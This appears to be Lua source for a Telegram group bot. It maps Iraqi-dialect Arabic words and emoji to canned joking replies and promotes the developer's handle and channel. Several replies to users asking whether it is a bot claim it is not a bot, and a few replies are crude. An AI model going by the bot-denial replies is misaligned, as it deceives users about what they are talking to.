if text =="🍁" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عطرها حبي🌝💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💐" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عطرها حبي🌝💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙄🙄🙄🙄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شلگيت فوگ وتباوع🤔لو انت احول🙄💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙄🙄🙄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شلگيت فوگ وتباوع🤔لو انت احول🙄"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙄🙄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شلگيت فوگ وتباوع🤔لو انت احول🙄💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شلگيت فوگ وتباوع🤔لو انت احول💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="طه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then timstoop(c,6) taha =   "ﭑإ́لـــﻤ̉̉ـطوُر ﻤ̉̉ـﭑإ́لـــﺗـ͜͡ہــٍّـــِّي إ́لـــعـُُـﮨ́́ﮨ́ﮨق فديـٍّــتـِّـّٰٰ̐ـ͜͜͡ާـه \n@TAHAJ20"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="خليجي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́لـــﻤ̉̉ـطوُر ﻤ̉̉ـﭑإ́لـــﺗـ͜͡ہــٍّـــِّي إ́لـــعـُُـﮨ́́ﮨ́ﮨق فديـٍّــتـِّـّٰٰ̐ـ͜͜͡ާـه \n@TAHAJ20"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="خليجي صاك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́لـــﻤ̉̉ـطوُر ﻤ̉̉ـﭑإ́لـــﺗـ͜͡ہــٍّـــِّي إ́لـــعـُُـﮨ́́ﮨ́ﮨق فديـٍّــتـِّـّٰٰ̐ـ͜͜͡ާـه \n@TAHAJ20"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="@TAHAJ20" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́لـــﻤ̉̉ـطوُر ﻤ̉̉ـﭑإ́لـــﺗـ͜͡ہــٍّـــِّي إ́لـــعـُُـﮨ́́ﮨ́ﮨق فديـٍّــتـِّـّٰٰ̐ـ͜͜͡ާـه \n@TAHAJ20"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اريد قناة" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تفضل حياتي @stormcli"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="قناة" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تفضل حياتي @stormcli"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اريد قناه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تفضل حياتي @stormcli"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="قناه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تفضل حياتي @stormcli"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نرتبط" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولك ما تبطل زحفك 😡😹 صارت قديمه ترا 😂🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نكبل" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولك ما تبطل زحفك 😡😹 صارت قديمه ترا 😂🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="عرفينا" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولك ما تبطل زحفك 😡😹 صارت قديمه ترا 🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نتعرف" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولك ما تبطل زحفك 😡😹 صارت قديمه ترا 🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نت منين" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو تزحف ولك 😹 خلوني بس اني ازحف 🙊😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="خلي نتعرف" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو تزحف ولك 😹😹 خلوني بس اني ازحف 🙊😹😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="عرفنا" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو تزحف ولك 😹😹 خلوني بس اني ازحف 🙊😹😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="هاذا شنو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لۧاٲ   مو بوت اقرا🙃 اسمي✨"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="يمكن بوت" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لۧاٲ   مو بوت اقرا اسمي✨"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اي بوت" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لۧاٲ   مو بوت😒 اقرا🙃 اسمي✨"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="هاذا بوت" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لۧاٲ   مو بوت😒 اقرا🙃 اسمي✨"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وين البوت" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لۧاٲ   مو بوت😒 اقرا اسمي✨"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعال نلعب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تعالو لعبو بمالي 😸"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعاي نلعب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تعالو لعبو بمالي 😸😸"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نلعب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تعالو لعبو بمالي 😸😸"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تلعبون" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تعالو لعبو بمالي 😸😸"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🤔🤔🤔🤔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولا يكعد راحه اينشتاين الصغير 😂😂"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🤔🤔🤔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولا يكعد راحه اينشتاين الصغير "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🤔🤔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولا يكعد راحه اينشتاين الصغير 😂😂"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🤔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولا يكعد راحه اينشتاين الصغير 😂"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🖕🖕🖕🖕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بحي هاذا لوفه وحطه فتيزك 😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🖕🖕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بحي هاذا لوفه وحطه فتيزك 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🖕🖕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بحي هاذا لوفه وحطه فتيزك 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🖕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بحي هاذا لوفه وحطه فتيزك 😹😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديتك حلكك بحي ☹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديتك حلكك بحي ☹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديتك حلكك بحي ☹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديتك حلكك بحي ☹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تصبح عله خير" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍😉 حياتي 😌 تصبح عله خير 💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="راح انام" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام  حياتي  تصبح عله خير 💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نعسان" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍😉 حياتي 😌 تصبح عله خير "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ت ع خ" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍 حياتي  تصبح عله خير "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تصبحون عله خير" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍😉 حياتي 😌 تصبح عله خير 💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تصبحي عله خير" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍😉 حياتي 😌 تصبح عله خير 💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تصبحين عله خير" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "روح نام 😍 حياتي  تصبح عله خير 💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دوووم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دووووم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج 😇😚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ددوم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج 😇"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دومك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج 😇😚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دومج" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج 😇😚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ادوم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله يديم انفاسك/ج 😇😚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شونج" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تمام وانت/ي شلونك/ج 😻🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شلونج" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تمام وانت/ي شلونك/ج 😻🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شخبارج" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تمام وانت/ي شلونك/ج 😻🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شلونجن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "تمام وانت/ي شلونك/ج 😻🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ضايجه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ🙍‍♂️💜 اركـ🕺🏻ـصلج🌚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ضايجهه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ‍♂️💜 اركـ🕺ـصلج"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="حيل ضايجه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ🙍‍♂️💜 اركـ🕺🏻ـصلج🌚"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ضووجهه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ🙍‍♂️💜 اركـ🕺🏻ـصلج"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ضوججه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ‍♂️💜 اركـ💃ـصلك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ضوجهه" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حـٍبيبي ءّ🙍‍♂️ اركـ💃ـصلك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اروح" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مٰٝـٍْ✋ۡـٍٰآ ترٰوۢۛඋ ،💛  احد لازمك🤦🏻‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اروحح" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مٰٝـٍْ✋ۡـٍٰآ ترٰوۢۛඋ ،  احد لازمك🤦🏻‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="راح اروح" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مٰٝـٍْ✋ۡـٍٰآ ترٰوۢۛඋ ،  احد لازمك🏻‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="رايح" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مٰٝـٍْ✋ۡـٍٰآ ترٰوۢۛඋ ،💛  احد لازمك🤦‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اجيييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﮪﮪﮧעّ ⁞⁞ُ͡‏   💗 بيك🚶🏻 حمبي 👻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اجي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﮪﮪﮧעّ ⁞⁞ُ͡‏    بيك🚶🏻 حمبي "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اجييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﮪﮪﮧעّ ⁞⁞ُ͡‏   💗 بيك🚶🏻 حمبي 👻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ممكنن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "أإآيٰٰ    تـٴِﮧ﴿🚶🏻﴾ۣـعالۂ͡†♩❥"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ممكن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "أإآيٰٰ    تـٴِﮧ﴿🚶﴾ۣـعالۂ͡†♩❥"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ببكن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "أإآيٰٰ    تـٴِﮧ﴿🚶🏻﴾ۣـعالۂ͡†♩❥"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="مممكن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "أإآيٰٰ    تـٴِﮧ﴿🏻﴾ۣـعالۂ͡†♩❥"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ديييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يمشوك🐕 بيها🙊😹 حمبي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يمشوك🐕 بيها🙊 حمبي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ديي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يمشوك🐕 بيها🙊😹 حمبي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="دي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يمشوك🐕 بيها🙊😹 حمبي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وليييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "۽ﺈنجٰٓجٰٓہ͡‌ـبۂ  ٰٓ₎ פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ولييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "۽ﺈنجٰٓجٰٓہ͡‌ـبۂ 🌝 ٰٓ₎ פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وليي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "۽ﺈنجٰٓجٰٓہ͡‌ـبۂ 🌝 ٰٓ₎ פـٍـٍبيبي ءّ🙍‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ولي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "۽ﺈنجٰٓجٰٓہ͡‌ـبۂ  ٰٓ₎ פـٍـٍبيبي ءّ🙍‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="احبكك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بعد روحي واني احبكم هم بس لتزحفلي رجاا 😸😸"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ااحبك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بعد روحي واني احبكم هم بس لتزحفلي رجاا 😸😸💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="احبككك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بعد روحي واني احبكم هم بس لتزحفلي رجاا 😸💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="احبكم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بعد روحي واني احبكم هم بس لتزحفلي رجاا 😸💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اييييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يب قابل اغشكم 🙈🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يب قابل اغشكم 🙈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ايي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يب قابل اغشكم 🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يب قابل اغشكم 🙈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعالو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " ما اروح المطورين مالتي ميقبلون "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعالوو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا ما اروح المطورين مالتي ميقبلون🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعالووو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا ما اروح المطورين مالتي ميقبلون😐🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="تعالوووو" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا ما اروح المطورين مالتي ميقبلون🎈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شبيك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مبينه شي سلامتك/ ج🎈😌"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شبيكم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مبينه شي سلامتك/ ج🎈😌"   storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شبيكك" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مبينه شي سلامتك/ ج🎈😌"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="شبيكمم" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "مبينه شي سلامتك/ ج🎈😌"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="جب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "جب بخشـ🏻ـمك פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="انجب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "جب بخشــمك פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="نجب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "جب بخشـ🏻ـمك פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="اانجب" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "جب بخشـ👃🏻ـمك פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وين" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• بٌِٰـﮧﮧأرِٰض اَٰلْٰلْٰهَٰہۧ اَٰلْٰـہوٍّاَٰسٌٍعٍِّـﮧهَٰہۧ😽💜ֆ"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وينن" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• بٌِٰـﮧﮧأرِٰض اَٰلْٰلْٰهَٰہۧ اَٰلْٰـہوٍّاَٰسٌٍعٍِّـﮧهَٰہۧ😽💜ֆ"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="وين تريد" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• بٌِٰـﮧﮧأرِٰض اَٰلْٰلْٰهَٰہۧ اَٰلْٰـہوٍّاَٰسٌٍعٍِّـﮧهَٰہۧ😽💜ֆ"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="ووين" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• بٌِٰـﮧﮧأرِٰض اَٰلْٰلْٰهَٰہۧ اَٰلْٰـہوٍّاَٰسٌٍعٍِّـﮧهَٰہۧ😽💜ֆ"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="باييي" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لله وياكـ💙✨ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☹️☹️☹️☹️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبيك متعصب حبي 😱😿 منو وياك 😿😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☹️☹️☹️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبيك متعصب حبي 😿 منو وياك 😿😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☹️☹️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبيك متعصب حبي 😱😿 منو وياك 😿😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☹️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبيك متعصب حبي 😱😿 منو وياك 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙂🙂🙂🙂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "اوف شهل الابتسامه احله من الكمر 😎😻😻😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙂😕😕😕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شكو عاوج حلكك😒😻😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙄🤞🏿" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =  "شبيك صافن على ايدك 😹😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
